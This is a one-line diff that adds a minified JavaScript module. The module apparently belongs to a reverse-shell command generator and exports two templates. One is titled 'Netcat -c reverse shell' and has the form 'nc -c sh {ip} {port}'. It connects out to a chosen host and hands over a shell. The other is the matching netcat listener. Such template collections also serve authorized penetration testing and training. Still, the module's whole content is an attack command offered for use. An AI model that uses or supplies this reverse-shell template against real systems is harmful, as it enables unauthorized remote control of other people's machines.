@@ -1,0 +1,1 @@
+const e=[{title:"Netcat -c reverse shell",template:"nc -c sh {ip} {port}",description:"Uses Netcat's -c option to execute a shell after connecting."},{title:"Netcat Listener",template:"nc -lvnp {port}"}],t={commands:e};export{e as commands,t as default};
